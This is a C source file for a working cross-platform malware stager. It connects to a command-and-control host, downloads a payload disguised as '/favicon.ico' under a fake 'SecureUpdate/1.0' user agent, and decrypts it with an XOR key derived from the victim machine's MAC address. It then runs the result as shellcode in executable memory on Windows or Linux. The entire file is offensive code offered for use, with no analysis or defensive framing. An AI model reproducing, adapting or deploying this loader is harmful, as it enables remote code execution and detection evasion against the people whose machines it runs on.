#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ================= WINDOWS HEADERS =================
#ifdef _WIN32
    #include <windows.h>
    #include <winhttp.h>
    #include <iphlpapi.h>
    #pragma comment(lib, "winhttp.lib")
    #pragma comment(lib, "iphlpapi.lib")

// ================= LINUX HEADERS =================
#elif __linux__
    #include <sys/mman.h>
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <net/if.h>
    #include <sys/ioctl.h>
    #include <netdb.h>
#endif

// DEFAULTS (Used if no arguments provided)
#define DEFAULT_IP "127.0.0.1"
#define DEFAULT_PORT 8080
#define C2_PATH L"/favicon.ico"     // Windows Path
#define C2_PATH_LINUX "/favicon.ico" // Linux Path
#define USER_AGENT L"SecureUpdate/1.0" // Windows UA
#define USER_AGENT_LINUX "SecureUpdate/1.0" // Linux UA

// ================= MAC ADDRESS LOGIC =================
void GetMacAddress(unsigned char* mac) {
#ifdef _WIN32
    PIP_ADAPTER_INFO pAdapterInfo;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    pAdapterInfo = (PIP_ADAPTER_INFO)malloc(sizeof(IP_ADAPTER_INFO));

    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (PIP_ADAPTER_INFO)malloc(ulOutBufLen);
    }
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        memcpy(mac, pAdapterInfo->Address, 6);
    }
    free(pAdapterInfo);
#elif __linux__
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    
    // NOTE: Change "eth0" to your specific interface (e.g., wlan0, ens33)
    strcpy(s.ifr_name, "eth0"); 
    
    if (ioctl(fd, SIOCGIFHWADDR, &s) == 0) {
        memcpy(mac, s.ifr_addr.sa_data, 6);
    } else {
        strcpy(s.ifr_name, "wlan0"); // Fallback
        if (ioctl(fd, SIOCGIFHWADDR, &s) == 0) {
            memcpy(mac, s.ifr_addr.sa_data, 6);
        }
    }
    close(fd);
#endif
}

// ================= MEMORY EXECUTION LOGIC =================
void ExecuteShellcode(unsigned char* code, int size) {
#ifdef _WIN32
    void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, code, size);
    ((void(*)())exec)();
#elif __linux__
    void* exec = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(exec, code, size);
    ((void(*)())exec)();
#endif
}

// ================= MAIN LOGIC =================
int main(int argc, char* argv[]) {
    // 1. Argument Parsing
    char* targetIP = DEFAULT_IP;
    int targetPort = DEFAULT_PORT;

    if (argc > 1) {
        targetIP = argv[1]; // First arg is IP
    }
    if (argc > 2) {
        targetPort = atoi(argv[2]); // Second arg is Port
    }

    printf("[*] Configuration: Connecting to %s:%d\n", targetIP, targetPort);

    // 2. Get MAC
    unsigned char macKey[6] = {0};
    GetMacAddress(macKey);
    printf("[*] Detected MAC: %02X-%02X-%02X-%02X-%02X-%02X\n", 
        macKey[0], macKey[1], macKey[2], macKey[3], macKey[4], macKey[5]);

    // 3. Download Logic
    unsigned char* buffer = NULL;
    int fileSize = 0;

#ifdef _WIN32
    // --- Windows Implementation ---
    
    // CONVERSION: Convert char* (Args) to wchar_t* (WinHTTP)
    wchar_t wIP[256];
    mbstowcs(wIP, targetIP, 256); // MultiByte String TO Wide Char String

    HINTERNET hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, wIP, targetPort, 0); // Use the converted wIP
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", C2_PATH, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        WinHttpReceiveResponse(hRequest, NULL);
        DWORD dwSize = 0;
        DWORD dwDownloaded = 0;
        WinHttpQueryDataAvailable(hRequest, &dwSize);
        buffer = (unsigned char*)malloc(dwSize);
        WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded);
        fileSize = dwDownloaded;
    }
#elif __linux__
    // --- Linux Implementation ---
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(targetPort);
    
    // Linux uses inet_pton which accepts standard char* strings
    if(inet_pton(AF_INET, targetIP, &serv_addr.sin_addr)<=0) {
        printf("[-] Invalid address/ Address not supported \n");
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("[-] Connection Failed\n");
        return 1;
    }

    // Build Request
    char request[512];
    sprintf(request, "GET %s HTTP/1.0\r\nUser-Agent: %s\r\nHost: %s\r\n\r\n", C2_PATH_LINUX, USER_AGENT_LINUX, targetIP);
    send(sock, request, strlen(request), 0);

    // Receive Data
    unsigned char tempBuf[4096];
    int valread = read(sock, tempBuf, 4096);
    
    // Strip Headers (Look for \r\n\r\n)
    int header_end = 0;
    for(int i=0; i < valread-3; i++){
        if(tempBuf[i] == '\r' && tempBuf[i+1] == '\n' && tempBuf[i+2] == '\r' && tempBuf[i+3] == '\n'){
            header_end = i + 4;
            break;
        }
    }
    
    fileSize = valread - header_end;
    if (fileSize > 0) {
        buffer = (unsigned char*)malloc(fileSize);
        memcpy(buffer, &tempBuf[header_end], fileSize);
    }
    close(sock);
#endif

    if (fileSize > 0 && buffer != NULL) {
        printf("[+] Downloaded %d bytes.\n", fileSize);

        // 4. Decrypt
        for (int i = 0; i < fileSize; i++) {
            buffer[i] = buffer[i] ^ macKey[i % 6];
        }
        printf("[+] Decrypted.\n");

        // 5. Execute
        ExecuteShellcode(buffer, fileSize);
    } else {
        printf("[-] Failed to download payload from %s:%d\n", targetIP, targetPort);
    }

    return 0;
}